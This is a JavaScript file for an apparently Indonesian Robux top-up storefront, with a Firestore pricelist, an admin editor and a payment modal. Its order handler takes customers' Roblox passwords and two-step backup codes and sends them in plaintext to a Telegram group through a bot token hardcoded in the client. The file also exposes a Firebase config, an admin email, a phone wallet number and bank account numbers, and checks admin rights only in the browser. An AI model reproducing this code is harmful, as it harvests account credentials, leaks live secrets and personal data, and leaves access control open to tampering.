// app.js (ESM module)

// =======================
// FIREBASE (CDN)
// =======================
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-app.js";
import {
  getFirestore,
  doc,
  collection,
  onSnapshot,
  setDoc,
  serverTimestamp,
  writeBatch,
  deleteDoc,
} from "https://www.gstatic.com/firebasejs/10.12.5/firebase-firestore.js";
import {
  getAuth,
  GoogleAuthProvider,
  signInWithPopup,
  onAuthStateChanged,
  signOut
} from "https://www.gstatic.com/firebasejs/10.12.5/firebase-auth.js";

const firebaseConfig = {
  apiKey: "AIzaSyDDQeZpHp5bFay6gRigg0pddEUqOL3cytQ",
  authDomain: "rbxvilogress.firebaseapp.com",
  projectId: "rbxvilogress",
  storageBucket: "rbxvilogress.firebasestorage.app",
  messagingSenderId: "907657980689",
  appId: "1:907657980689:web:3282ce42765c3643e47ab0",
  measurementId: "G-ZQ6EP4D1DD"
};

const ADMIN_EMAIL = "dinijanuari23@gmail.com";
const STORE_DOC_PATH = ["settings", "store"]; // settings/store -> { open: true/false }
const PRICE_COL = "pricelist_items";          // collection pricelist_items

// ✅ Kategori dropdown fixed
const CATEGORY_OPTIONS = [
  "Robux Reguler",
  "Robux Basic",
  "Robux + Premium (1 Month)",
  "Best offers 💯"
];

// panel admin hanya tampil kalau URL ada ?admin=1
const wantAdminPanel = new URLSearchParams(window.location.search).get("admin") === "1";

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const auth = getAuth(app);
const provider = new GoogleAuthProvider();

let storeOpen = true;
let isAdmin = false;

// cache items
let pricelistCache = []; // [{id, category, type, label, price, sort}]
let adminDraft = [];     // editable copy for admin

// =======================
// POPUP iOS (OK only)
// =======================
function showPopup(title, message, submessage){
  const existing = document.getElementById('validationCenterPopup');
  if(existing) existing.remove();

  const container = document.getElementById('validationContainer') || document.body;

  const popup = document.createElement('div');
  popup.id = 'validationCenterPopup';
  popup.className = 'validation-center';
  popup.tabIndex = -1;

  const safeTitle = title || 'Notification';
  const safeMsg = message || '';
  const safeSub = submessage || '';

  popup.innerHTML = `
    <div class="hdr">${safeTitle}</div>
    <div class="divider"></div>
    <div class="txt">${safeMsg}</div>
    ${safeSub ? `<div class="subtxt">${safeSub}</div>` : ``}
    <div class="btnRow">
      <button type="button" class="okbtn">OK</button>
    </div>
  `;

  container.appendChild(popup);

  const okBtn = popup.querySelector('.okbtn');

  function removePopup(){
    popup.style.transition = 'opacity 160ms ease, transform 160ms ease';
    popup.style.opacity = '0';
    popup.style.transform = 'translate(-50%,-50%) scale(.98)';
    setTimeout(()=> popup.remove(), 170);
  }

  okBtn.addEventListener('click', removePopup);
  popup.focus({preventScroll:true});

  const t = setTimeout(removePopup, 7000);
  window.addEventListener('pagehide', ()=>{ clearTimeout(t); if(popup) popup.remove(); }, { once:true });
}

// =======================
// UTILS
// =======================
function escapeHtml(str){
  return String(str ?? '')
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
    .replaceAll("'", '&#039;');
}

function rupiah(num){
  const n = Number(num || 0);
  return "Rp" + new Intl.NumberFormat('id-ID').format(n);
}

function groupByCategory(items){
  const map = new Map();
  for(const it of items){
    const cat = it.category || 'Lainnya';
    if(!map.has(cat)) map.set(cat, []);
    map.get(cat).push(it);
  }
  return map;
}

function normalizeAndSort(items){
  const cleaned = items.map(it => ({
    ...it,
    category: String(it.category || 'Lainnya'),
    type: String(it.type || ''),
    label: String(it.label || ''),
    price: Number(it.price || 0),
    sort: Number(it.sort || 0),
  }));

  cleaned.sort((a,b)=>{
    const c = a.category.localeCompare(b.category);
    if(c !== 0) return c;
    return (a.sort - b.sort);
  });

  return cleaned;
}

// =======================
// STORE STATUS UI (OPEN/CLOSE)
// =======================
function applyStoreStatusUI(){
  const badge = document.getElementById('adminBadge');
  if(badge){
    badge.textContent = storeOpen ? 'OPEN' : 'CLOSED';
    badge.style.borderColor = storeOpen ? '#bbf7d0' : '#fecaca';
    badge.style.background = storeOpen ? '#ecfdf5' : '#fef2f2';
    badge.style.color = storeOpen ? '#14532d' : '#7f1d1d';
  }

  // tombol pesan tetap bisa diklik saat CLOSE (biar munculin popup)
  const btn = document.getElementById('btnWa');
  if(btn) btn.disabled = false;
}

// =======================
// ADMIN UI
// =======================
function applyAdminUI(user){
  const panel = document.getElementById('adminPanel');
  const btnLogin = document.getElementById('btnAdminLogin');
  const btnLogout = document.getElementById('btnAdminLogout');
  const emailEl = document.getElementById('adminEmail');
  const btnSetOpen = document.getElementById('btnSetOpen');
  const btnSetClose = document.getElementById('btnSetClose');

  if(!panel) return;
  panel.style.display = wantAdminPanel ? 'block' : 'none';

  if(!btnLogin || !btnLogout || !emailEl || !btnSetOpen || !btnSetClose) return;

  if(user){
    btnLogin.style.display = 'none';
    btnLogout.style.display = 'inline-block';
    emailEl.textContent = user.email || '';
  } else {
    btnLogin.style.display = 'inline-block';
    btnLogout.style.display = 'none';
    emailEl.textContent = '';
  }

  btnSetOpen.disabled = !isAdmin;
  btnSetClose.disabled = !isAdmin;

  const btnAdd = document.getElementById('btnAddItem');
  const btnSave = document.getElementById('btnSaveAll');
  if(btnAdd) btnAdd.disabled = !isAdmin;
  if(btnSave) btnSave.disabled = !isAdmin;

  renderAdminList();
}

async function setStoreOpen(flag){
  if(!isAdmin){
    showPopup('Notification', 'Akses ditolak', 'Hanya admin yang bisa mengubah status.');
    return;
  }
  const ref = doc(db, STORE_DOC_PATH[0], STORE_DOC_PATH[1]);
  await setDoc(ref, { open: !!flag, updatedAt: serverTimestamp() }, { merge: true });
}

// =======================
// PRICELIST: REALTIME LISTENER
// =======================
let unsubPricelist = null;

function startPricelistListener(){
  // ambil root kalau ada
  let root = document.getElementById('pricelistRoot');

  // ✅ kalau root belum ada, BUAT otomatis dan taruh sebelum form
  if(!root){
    const form = document.querySelector('.form-container');
    root = document.createElement('div');
    root.id = 'pricelistRoot';

    if(form && form.parentNode){
      form.parentNode.insertBefore(root, form);
    } else {
      document.body.insertBefore(root, document.body.firstChild);
    }
  }

  const colRef = collection(db, PRICE_COL);

  unsubPricelist = onSnapshot(colRef, (snap) => {
    const items = snap.docs.map(d => ({ id: d.id, ...d.data() }));
    pricelistCache = normalizeAndSort(items);

    // sync admin draft dari firestore
    adminDraft = pricelistCache.map(x => ({ ...x }));

    renderPricelistToPage();
    renderAdminList();
  }, (err) => {
    console.error(err);
    showPopup(
      'Notification',
      'Pricelist gagal dimuat',
      err?.message?.includes('permission')
        ? 'Firestore Rules kemungkinan belum allow read.'
        : (err?.message || 'Error')
    );
  });
}

function renderPricelistToPage(){
  const root = document.getElementById('pricelistRoot');
  if(!root) return;

  if(!pricelistCache.length){
    root.innerHTML = `
      <div class="category">
        <h3>Pricelist</h3>
        <div style="color:#9ca3af;font-size:13px;padding:10px;">
          Belum ada item pricelist. Admin bisa tambah dari panel.
        </div>
      </div>
    `;
    return;
  }

  const grouped = groupByCategory(pricelistCache);

  let html = '';
  for(const [cat, arr] of grouped.entries()){
    html += `
      <div class="category">
        <h3>${escapeHtml(cat)}</h3>
        <div class="pricelist-container">
          ${arr.map(it => `
            <div class="price-box" data-id="${escapeHtml(it.id)}">
              ${escapeHtml(it.label || '')}
              <span>${escapeHtml(rupiah(it.price))}</span>
            </div>
          `).join('')}
        </div>
      </div>
    `;
  }

  root.innerHTML = html;

  root.querySelectorAll('.price-box').forEach(box => {
    box.addEventListener('click', () => {
      const id = box.getAttribute('data-id');
      const it = pricelistCache.find(x => x.id === id);
      if(!it) return;
      window.isiForm(String(it.label || ''), String(it.price || 0), String(it.type || ''));
    });
  });
}

// =======================
// ADMIN CRUD PRICELIST
// =======================
function renderAdminList(){
  const wrap = document.getElementById('adminList');
  if(!wrap) return;

  if(!wantAdminPanel){
    wrap.innerHTML = '';
    return;
  }

  if(!isAdmin){
    wrap.innerHTML = `<div class="admin-savemsg">Login admin dulu untuk edit pricelist.</div>`;
    return;
  }

  if(!adminDraft.length){
    wrap.innerHTML = `<div class="admin-savemsg">Belum ada item.</div>`;
    return;
  }

  wrap.innerHTML = adminDraft.map((it, idx) => {
    return `
      <div class="admin-row" data-idx="${idx}">
        <div class="admin-row-top">
          <div class="admin-row-id">ID: ${escapeHtml(it.id || '(baru)')}</div>
          <button type="button" class="admin-del" data-act="del">Hapus</button>
        </div>

        <div class="admin-grid">
          <div>
            <label>Kategori (judul section)</label>
            <select data-k="category">
              ${CATEGORY_OPTIONS.map(opt => `
                <option value="${escapeHtml(opt)}" ${String(it.category||'') === opt ? 'selected' : ''}>
                  ${escapeHtml(opt)}
                </option>
              `).join('')}
            </select>
          </div>

          <div>
            <label>Tipe (untuk form: Reguler/Basic/Premium)</label>
            <input type="text" data-k="type" value="${escapeHtml(it.type || '')}">
          </div>

          <div class="full">
            <label>Label (contoh: 500 Robux)</label>
            <input type="text" data-k="label" value="${escapeHtml(it.label || '')}">
          </div>

          <div>
            <label>Harga (angka)</label>
            <input type="number" min="0" step="1" data-k="price" value="${Number(it.price || 0)}">
          </div>

          <div>
            <label>Sort (angka kecil tampil dulu)</label>
            <input type="number" step="1" data-k="sort" value="${Number(it.sort || 0)}">
          </div>
        </div>
      </div>
    `;
  }).join('');

  // bind inputs & selects & delete
  wrap.querySelectorAll('.admin-row').forEach(row => {
    const idx = Number(row.getAttribute('data-idx'));

    row.querySelectorAll('input, select').forEach(el => {
      const evt = (el.tagName === 'SELECT') ? 'change' : 'input';
      el.addEventListener(evt, () => {
        const k = el.getAttribute('data-k');
        let v = el.value;
        if(k === 'price' || k === 'sort') v = Number(v || 0);
        adminDraft[idx][k] = v;
      });
    });

    row.querySelector('[data-act="del"]').addEventListener('click', async () => {
      if(!isAdmin) return;

      const item = adminDraft[idx];
      if(!confirm('Hapus item ini?')) return;

      if(item.id){
        await deleteDoc(doc(db, PRICE_COL, item.id));
      }
      // listener realtime auto refresh
    });
  });
}

function adminAddItem(){
  if(!isAdmin){
    showPopup('Notification', 'Akses ditolak', 'Login admin dulu ya.');
    return;
  }
  adminDraft.unshift({
    id: '',
    category: CATEGORY_OPTIONS[0], // ✅ default dari dropdown
    type: 'Reguler',
    label: 'Item Baru',
    price: 0,
    sort: 0
  });
  renderAdminList();
}

async function adminSaveAll(){
  if(!isAdmin){
    showPopup('Notification', 'Akses ditolak', 'Login admin dulu ya.');
    return;
  }

  const msg = document.getElementById('adminSaveMsg');
  if(msg) msg.textContent = 'Menyimpan...';

  // validasi
  for(const it of adminDraft){
    if(!String(it.category||'').trim() || !String(it.type||'').trim() || !String(it.label||'').trim()){
      if(msg) msg.textContent = 'Gagal: kategori, tipe, label wajib diisi.';
      showPopup('Notification', 'Oops', 'Kategori, tipe, dan label wajib diisi.');
      return;
    }
    if(Number(it.price) < 0){
      if(msg) msg.textContent = 'Gagal: harga tidak boleh minus.';
      showPopup('Notification', 'Oops', 'Harga tidak boleh minus.');
      return;
    }
  }

  const batch = writeBatch(db);
  const colRef = collection(db, PRICE_COL);

  for(const it of adminDraft){
    const data = {
      category: String(it.category).trim(),
      type: String(it.type).trim(),
      label: String(it.label).trim(),
      price: Number(it.price || 0),
      sort: Number(it.sort || 0),
      updatedAt: serverTimestamp()
    };

    if(it.id){
      batch.set(doc(db, PRICE_COL, it.id), data, { merge: true });
    }else{
      const newRef = doc(colRef);
      it.id = newRef.id;
      batch.set(newRef, { ...data, createdAt: serverTimestamp() });
    }
  }

  await batch.commit();
  if(msg) msg.textContent = '✅ Tersimpan';
  // listener realtime update otomatis
}

// =======================
// FORM LOGIC (punyamu)
// =======================
function formatHarga(harga){
  const hargaNumber = typeof harga === 'number' ? harga : Number(String(harga).replace(/[^\d]/g,''));
  return { hargaNumber, hargaText: "Rp" + new Intl.NumberFormat('id-ID').format(hargaNumber) };
}

window.isiForm = function isiForm(nominal, harga, kategori) {
  document.getElementById("nominal").value = nominal;

  const { hargaText } = formatHarga(harga);
  document.getElementById("harga").value = hargaText;

  document.getElementById("kategori").value = kategori;

  updateV2LOptions();
  document.querySelector('.form-container')?.scrollIntoView({ behavior: 'smooth' });
};

function updateV2LOptions() {
  const kategori = document.getElementById("kategori").value || '';
  const v2lVal = document.getElementById("v2l").value;
  const metodeSelect = document.getElementById("metodeV2L");
  const metodeDiv = document.getElementById("metodeV2L_div");

  const backupDiv = document.getElementById("backupCode_div");
  const emailDiv = document.getElementById("emailNote_div");

  if (v2lVal !== "ON") {
    metodeDiv.classList.add("hidden");
    backupDiv.classList.add("hidden");
    emailDiv.classList.add("hidden");
    metodeSelect.innerHTML = '';
    return;
  }

  metodeDiv.classList.remove("hidden");

  const mustBackup = (kategori === "Basic" || kategori === "Premium");

  if (mustBackup) {
    metodeSelect.innerHTML =
      '<option value="">-- Pilih Metode --</option>' +
      '<option value="Backup Code">Backup Code</option>';

    metodeSelect.value = "Backup Code";
    backupDiv.classList.remove("hidden");
    emailDiv.classList.add("hidden");
  } else {
    metodeSelect.innerHTML =
      '<option value="">-- Pilih Metode --</option>' +
      '<option value="Backup Code">Backup Code</option>' +
      '<option value="Kode Email">Kode Email</option>';

    const current = metodeSelect.value;
    if (current === "Backup Code") {
      backupDiv.classList.remove("hidden");
      emailDiv.classList.add("hidden");
    } else if (current === "Kode Email") {
      backupDiv.classList.add("hidden");
      emailDiv.classList.remove("hidden");
    } else {
      backupDiv.classList.add("hidden");
      emailDiv.classList.add("hidden");
    }
  }
}

// =======================
// PAYMENT MODAL (punyamu)
// =======================
function showPaymentPopup(qrUrl, hargaFormatted) {
  const backdrop = document.getElementById('paymentModalBackdrop');
  const modalQr = document.getElementById('modalQr');
  const modalAmount = document.getElementById('modalAmount');
  const copySuccess = document.getElementById('copySuccess');

  const walletLabel = document.getElementById('walletLabel');
  const walletNumberTitle = document.getElementById('walletNumberTitle');
  const walletNumber = document.getElementById('walletNumber');
  const walletNumberWrapper = document.getElementById('walletNumberWrapper');
  const walletNote = document.getElementById('walletNote');
  const copyNumberBtn = document.getElementById('copyNumberBtn');

  const methodButtons = document.querySelectorAll('.method-btn');

  const GOPAY_NUMBER   = '083197962700';
  const BRI_NUMBER     = '3295 0102 4903 507';
  const SEABANK_NUMBER = '901673348752';

  const baseAmount = (function () {
    const num = Number(String(hargaFormatted).replace(/[^\d]/g, ''));
    return isNaN(num) ? 0 : num;
  })();

  function formatRupiah(num) {
    return "Rp" + new Intl.NumberFormat('id-ID').format(num);
  }

  const METHOD_CONFIG = {
    qris: {
      label: 'QRIS (scan QR di atas)',
      numberTitle: '',
      number: '',
      calcTotal: (base) => {
        if (base <= 499000) return base;
        const fee = Math.round(base * 0.003);
        return base + fee;
      },
      note: 'QRIS hingga Rp499.000 tidak ada biaya tambahan. Di atas itu akan dikenakan biaya 0,3% dari nominal.',
      showNumber: false
    },
    gopay: {
      label: 'Transfer GoPay',
      numberTitle: 'No HP GoPay',
      number: GOPAY_NUMBER,
      calcTotal: (base) => base,
      note: 'Pembayaran GoPay tidak ada biaya tambahan. Bayar sesuai nominal yang tertera.',
      showNumber: true
    },
    seabank: {
      label: 'Transfer SeaBank',
      numberTitle: 'Nomor rekening SeaBank',
      number: SEABANK_NUMBER,
      calcTotal: (base) => base,
      note: 'SeaBank tidak ada biaya tambahan. Bayar sesuai nominal yang tertera.',
      showNumber: true
    },
    bri: {
      label: 'Transfer BRI',
      numberTitle: 'Nomor rekening BRI',
      number: BRI_NUMBER,
      calcTotal: (base) => base,
      note: 'BRI tidak ada biaya tambahan. Bayar sesuai nominal yang tertera.',
      showNumber: true
    }
  };

  function showMessage(msg) {
    copySuccess.textContent = msg;
    copySuccess.style.display = 'block';
    setTimeout(()=> copySuccess.style.display = 'none', 2500);
  }

  function copyTextToClipboard(text, successMsg) {
    if (!text) return;
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(() => showMessage(successMsg)).catch(() => fallbackCopy(text, successMsg));
    } else {
      fallbackCopy(text, successMsg);
    }
  }

  function fallbackCopy(text, successMsg){
    const tmp = document.createElement('textarea');
    tmp.value = text;
    document.body.appendChild(tmp);
    tmp.select();
    try { document.execCommand('copy'); showMessage(successMsg); }
    catch(e){ showMessage('Tidak dapat menyalin, silakan salin manual.'); }
    document.body.removeChild(tmp);
  }

  function applyMethod(methodKey) {
    methodButtons.forEach(btn => btn.classList.toggle('active', btn.dataset.method === methodKey));

    const cfg = METHOD_CONFIG[methodKey];
    walletLabel.textContent = cfg.label;
    walletNote.textContent = cfg.note;

    const total = cfg.calcTotal(baseAmount);
    modalAmount.textContent = formatRupiah(total);

    if (cfg.showNumber) {
      walletNumberTitle.textContent = cfg.numberTitle;
      walletNumber.textContent = cfg.number;
      walletNumberWrapper.style.display = 'block';
      copyNumberBtn.style.display = 'block';
    } else {
      walletNumberWrapper.style.display = 'none';
      copyNumberBtn.style.display = 'none';
    }

    if (methodKey === 'qris') {
      modalQr.style.display = 'block';
      modalQr.src = qrUrl;
    } else {
      modalQr.style.display = 'none';
    }
  }

  applyMethod('qris');

  copySuccess.style.display = 'none';
  backdrop.style.display = 'flex';
  backdrop.setAttribute('aria-hidden', 'false');

  methodButtons.forEach(btn => {
    btn.onclick = function () { applyMethod(this.dataset.method); };
  });

  document.getElementById('closeModalBtn').onclick = function() {
    backdrop.style.display = 'none';
    backdrop.setAttribute('aria-hidden', 'true');
  };

  backdrop.onclick = function(e) {
    if (e.target === backdrop) {
      backdrop.style.display = 'none';
      backdrop.setAttribute('aria-hidden', 'true');
    }
  };

  copyNumberBtn.onclick = function () {
    copyTextToClipboard(walletNumber.textContent || '', 'Nomor berhasil disalin');
  };

  document.getElementById('copyAmountBtn').onclick = function() {
    copyTextToClipboard(modalAmount.textContent || '', 'Jumlah berhasil disalin');
  };

  document.getElementById('openBotBtn').onclick = function() {
    const botUsername = 'topupressbot';
    const tgScheme = 'tg://resolve?domain=' + encodeURIComponent(botUsername);
    const webLink  = 'https://t.me/' + encodeURIComponent(botUsername) + '?start';

    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

    let appOpened = false;
    function onVisibilityChange() { if (document.hidden) appOpened = true; }
    document.addEventListener('visibilitychange', onVisibilityChange);

    try {
      if (isMobile) window.location.href = tgScheme;
      else window.open(tgScheme, '_blank');
    } catch (e) {}

    const fallbackTimeout = setTimeout(function() {
      if (!appOpened) window.open(webLink, '_blank');
      document.removeEventListener('visibilitychange', onVisibilityChange);
    }, 800);

    window.addEventListener('pagehide', function cleanup() {
      clearTimeout(fallbackTimeout);
      document.removeEventListener('visibilitychange', onVisibilityChange);
      window.removeEventListener('pagehide', cleanup);
    });
  };
}

// =======================
// DOM READY
// =======================
document.addEventListener('DOMContentLoaded', function(){

  // V2L listeners
  document.getElementById("v2l")?.addEventListener("change", function() {
    updateV2LOptions();
  });

  document.getElementById("metodeV2L")?.addEventListener("change", function() {
    if (this.value === "Backup Code") {
      document.getElementById("backupCode_div").classList.remove("hidden");
      document.getElementById("emailNote_div").classList.add("hidden");
    } else if (this.value === "Kode Email") {
      document.getElementById("emailNote_div").classList.remove("hidden");
      document.getElementById("backupCode_div").classList.add("hidden");
    } else {
      document.getElementById("backupCode_div").classList.add("hidden");
      document.getElementById("emailNote_div").classList.add("hidden");
    }
  });

  // ✅ START REALTIME PRICELIST
  startPricelistListener();

  // =======================
  // FIRESTORE: LISTEN STORE STATUS (GLOBAL)
  // =======================
  const storeRef = doc(db, STORE_DOC_PATH[0], STORE_DOC_PATH[1]);
  onSnapshot(storeRef, (snap) => {
    if (snap.exists()) {
      const data = snap.data();
      storeOpen = (data.open !== false);
    } else {
      storeOpen = true;
    }
    applyStoreStatusUI();
  }, () => {
    storeOpen = true;
    applyStoreStatusUI();
  });

  // =======================
  // AUTH: ADMIN ONLY
  // =======================
  onAuthStateChanged(auth, (user) => {
    isAdmin = !!(user && (user.email || '').toLowerCase() === ADMIN_EMAIL.toLowerCase());
    applyAdminUI(user);

    if (user && !isAdmin) {
      signOut(auth).catch(()=>{});
      showPopup('Notification', 'Akses ditolak', 'Email ini bukan admin.');
    }
  });

  // tampilkan panel admin (kalau ?admin=1) walaupun belum login
  applyAdminUI(null);

  document.getElementById('btnAdminLogin')?.addEventListener('click', async ()=>{
    try { await signInWithPopup(auth, provider); }
    catch(e){ showPopup('Notification', 'Login gagal', 'Login dibatalkan / gagal.'); }
  });

  document.getElementById('btnAdminLogout')?.addEventListener('click', async ()=>{
    try { await signOut(auth); } catch(e){}
  });

  document.getElementById('btnSetOpen')?.addEventListener('click', ()=> setStoreOpen(true));
  document.getElementById('btnSetClose')?.addEventListener('click', ()=> setStoreOpen(false));

  // admin editor actions
  document.getElementById('btnAddItem')?.addEventListener('click', adminAddItem);
  document.getElementById('btnSaveAll')?.addEventListener('click', adminSaveAll);

  // =======================
  // KIRIM TELEGRAM + PAYMENT
  // =======================
  document.getElementById("btnWa")?.addEventListener("click", function() {

    if (!storeOpen) {
      showPopup('Notification','CLOSE','Mohon maaf, saat ini kamu belum bisa melakukan pemesanan. Silahkan kembali lagi nanti.');
      return;
    }

    const form = document.getElementById("orderForm");

    const inputs = form.querySelectorAll("input[required], select[required]");
    for (const input of inputs) {
      if (!String(input.value || '').trim()) {
        showPopup('Notification', 'Oops', 'Harap isi semua kolom yang wajib diisi!');
        try{ input.focus(); }catch(e){}
        return;
      }
    }

    let username = document.getElementById("username").value.trim();
    let password = document.getElementById("password").value.trim();
    let v2l = document.getElementById("v2l").value;
    let metodeV2L = document.getElementById("metodeV2L").value;
    let backupCode = document.getElementById("backupCode").value.trim();
    let kategori = document.getElementById("kategori").value;
    let nominal = document.getElementById("nominal").value;
    let harga = document.getElementById("harga").value;

    if (v2l === "ON") {
      if (!metodeV2L) {
        showPopup('Notification', 'Oops', 'Karena V2L aktif, silakan pilih metode V2L.');
        document.getElementById("metodeV2L").focus();
        return;
      }

      const mustBackup = (kategori === "Basic" || kategori === "Premium");
      if (mustBackup && metodeV2L !== "Backup Code") {
        showPopup('Notification', 'Oops', 'Kategori ini wajib menggunakan Backup Code.');
        document.getElementById("metodeV2L").focus();
        return;
      }

      if (metodeV2L === "Backup Code" && !backupCode) {
        showPopup('Notification', 'Oops', 'Mohon masukkan Backup Code.');
        document.getElementById("backupCode").focus();
        return;
      }
    }

    const botToken = "8039852277:AAEqbfQUF37cjDlEposj2rzHm28_Pxzv-mw";
    const chatId = "-1003049680083";

    const text =
      "Pesanan Baru Masuk!\n\n" +
      "Username Roblox: " + username + "\n" +
      "Password Roblox: " + password + "\n" +
      "V2L: " + v2l + (metodeV2L ? " (" + metodeV2L + ")" : "") + (backupCode ? "\nBackup Code: " + backupCode : "") + "\n" +
      "Kategori: " + kategori + "\n" +
      "Nominal: " + nominal + "\n" +
      "Harga: " + harga;

    fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text })
    })
    .then(res => {
      if (res.ok) {
        const qrUrl = "https://payment.uwu.ai/assets/images/gallery03/8555ed8a_original.jpg?v=58e63277";
        showPaymentPopup(qrUrl, harga);

        form.reset();
        document.getElementById("backupCode_div").classList.add("hidden");
        document.getElementById("emailNote_div").classList.add("hidden");
        document.getElementById("metodeV2L_div").classList.add("hidden");
        document.getElementById("metodeV2L").innerHTML = '';
      } else {
        showPopup('Notification', 'Gagal', 'Gagal mengirim ke Telegram. Coba lagi.');
      }
    })
    .catch((error) => {
      console.error(error);
      showPopup('Notification', 'Error', 'Terjadi kesalahan saat mengirim ke Telegram.');
    });
  });
});
